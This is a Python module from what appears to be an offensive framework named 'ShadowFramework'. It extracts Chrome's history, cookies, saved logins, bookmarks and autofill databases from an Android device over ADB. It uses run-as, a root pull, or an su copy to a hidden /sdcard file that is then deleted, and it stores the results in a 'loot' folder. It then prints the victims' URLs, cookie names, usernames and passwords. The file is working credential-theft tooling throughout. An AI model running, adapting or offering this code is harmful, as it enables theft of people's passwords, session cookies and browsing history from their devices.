"""
ShadowFramework — Chrome History & Credential Extractor
Extracts Chrome browsing data from Android via ADB using real database access.
"""
import subprocess
import sqlite3
import os
from pathlib import Path
from rich.console import Console
from rich.table import Table
from utils.logger import log_action

console = Console()

def _adb(dev, *args, timeout=15):
    cmd = ['adb', '-s', dev] + list(args)
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return r.stdout.strip(), r.stderr.strip(), r.returncode
    except subprocess.TimeoutExpired:
        return '', 'timeout', 1


CHROME_PKG = 'com.android.chrome'
CHROME_DB_DIR = '/data/data/com.android.chrome/app_chrome/Default'
DB_FILES = {
    'History':    'Browsing history',
    'Cookies':    'Session cookies',
    'Login Data': 'Saved passwords',
    'Bookmarks':  'Saved bookmarks',
    'Web Data':   'Autofill data',
}


class Module:
    MODULE_INFO = {
        'name': 'post/android/chrome_history_extractor_uxss',
        'description': 'Extracts Chrome databases (history, cookies, passwords, bookmarks) from Android via ADB.',
        'options': {
            'DEVICE_ID': 'Target device serial',
            'TARGETS':   'Comma-separated DB names: History,Cookies,Login Data,Bookmarks [default: all]',
            'LIMIT':     'Max entries per DB [default: 100]',
        }
    }

    def __init__(self, framework):
        self.framework = framework

    def _extract_db(self, device_id, db_name, loot_dir):
        """Try extracting Chrome database."""
        remote = f'{CHROME_DB_DIR}/{db_name}'
        local = loot_dir / db_name.replace(' ', '_')

        # Method 1: run-as
        out, err, rc = _adb(device_id, 'shell', f'run-as {CHROME_PKG} cat "databases/{db_name}"')
        if rc == 0 and out and 'not debuggable' not in err:
            with open(local, 'wb') as f:
                f.write(out.encode('latin-1'))
            if local.stat().st_size > 100:
                return str(local), 'run-as'

        # Method 2: Direct pull (root)
        _, _, rc = _adb(device_id, 'pull', remote, str(local))
        if rc == 0 and local.exists() and local.stat().st_size > 100:
            return str(local), 'root'

        # Method 3: su + cp to accessible location
        tmp = f'/sdcard/.shadow_{db_name.replace(" ", "_")}'
        _adb(device_id, 'shell', f'su -c "cp \\"{remote}\\" \\"{tmp}\\""')
        _, _, rc = _adb(device_id, 'pull', tmp, str(local))
        _adb(device_id, 'shell', 'rm', tmp)
        if rc == 0 and local.exists() and local.stat().st_size > 100:
            return str(local), 'su'

        return None, None

    def _query_history(self, db_path, limit):
        """Extract browsing history."""
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute(f"""
                SELECT url, title, visit_count, 
                       datetime(last_visit_time/1000000-11644473600, 'unixepoch') as last_visit
                FROM urls ORDER BY last_visit_time DESC LIMIT {limit}
            """)
            rows = cur.fetchall()
            conn.close()

            if rows:
                table = Table(title=f"Chrome History ({len(rows)} entries)")
                table.add_column("URL", style="cyan", max_width=50)
                table.add_column("Title", style="white", max_width=30)
                table.add_column("Visits", style="yellow")
                table.add_column("Last Visit", style="dim")
                for url, title, visits, last in rows:
                    table.add_row(url[:50], (title or '')[:30], str(visits), str(last))
                console.print(table)
            return rows
        except Exception as e:
            console.print(f"  [red]Query error: {e}[/red]")
            return []

    def _query_cookies(self, db_path, limit):
        """Extract cookies."""
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute(f"""
                SELECT host_key, name, value, path, is_secure, is_httponly,
                       datetime(expires_utc/1000000-11644473600, 'unixepoch') as expires
                FROM cookies ORDER BY creation_utc DESC LIMIT {limit}
            """)
            rows = cur.fetchall()
            conn.close()

            if rows:
                table = Table(title=f"Chrome Cookies ({len(rows)} entries)")
                table.add_column("Domain", style="cyan", max_width=30)
                table.add_column("Name", style="yellow", max_width=20)
                table.add_column("Secure", style="dim")
                for host, name, val, path, secure, http, exp in rows:
                    table.add_row(host, name, "🔒" if secure else "")
                console.print(table)
            return rows
        except Exception as e:
            console.print(f"  [red]Query error: {e}[/red]")
            return []

    def _query_logins(self, db_path, limit):
        """Extract saved passwords."""
        try:
            conn = sqlite3.connect(db_path)
            cur = conn.cursor()
            cur.execute(f"""
                SELECT origin_url, username_value, password_value,
                       datetime(date_created/1000000-11644473600, 'unixepoch') as created
                FROM logins ORDER BY date_created DESC LIMIT {limit}
            """)
            rows = cur.fetchall()
            conn.close()

            if rows:
                table = Table(title=f"Chrome Saved Logins ({len(rows)})")
                table.add_column("URL", style="cyan", max_width=40)
                table.add_column("Username", style="yellow")
                table.add_column("Password", style="red")
                for url, user, pwd, created in rows:
                    pwd_display = f"[encrypted {len(pwd)}B]" if isinstance(pwd, bytes) else str(pwd)[:20]
                    table.add_row(url[:40], user, pwd_display)
                console.print(table)
            return rows
        except Exception as e:
            console.print(f"  [red]Query error: {e}[/red]")
            return []

    def run(self):
        device_id = self.framework.options.get('DEVICE_ID', '')
        targets = self.framework.options.get('TARGETS', 'all')
        limit = int(self.framework.options.get('LIMIT', '100'))

        if not device_id:
            out, _, _ = _adb('', 'devices')
            for line in out.splitlines()[1:]:
                if '\tdevice' in line:
                    device_id = line.split('\t')[0]
                    break
        if not device_id:
            console.print("[red][!] No device found.[/red]")
            return

        console.print(f"[cyan][*] Chrome data extraction on {device_id}...[/cyan]")
        log_action(f"Chrome extraction on {device_id}")

        # Check Chrome installation
        installed, _, _ = _adb(device_id, 'shell', 'pm', 'list', 'packages', CHROME_PKG)
        if CHROME_PKG not in installed:
            console.print(f"[red][!] Chrome not installed.[/red]")
            return

        loot_dir = Path('loot/chrome')
        loot_dir.mkdir(parents=True, exist_ok=True)

        dbs = DB_FILES if targets == 'all' else {t.strip(): DB_FILES.get(t.strip(), t.strip()) for t in targets.split(',')}

        for db_name, desc in dbs.items():
            console.print(f"\n[cyan][*] Extracting: {db_name} ({desc})...[/cyan]")
            path, method = self._extract_db(device_id, db_name, loot_dir)
            
            if path:
                console.print(f"  [green]✓ Extracted via {method} ({Path(path).stat().st_size} bytes)[/green]")
                
                if 'History' in db_name:
                    self._query_history(path, limit)
                elif 'Cookie' in db_name:
                    self._query_cookies(path, limit)
                elif 'Login' in db_name:
                    self._query_logins(path, limit)
            else:
                console.print(f"  [red]✗ Could not extract (need root/debuggable app)[/red]")

        console.print(f"\n[bold green][+] Chrome extraction complete. Data in: {loot_dir}[/bold green]")
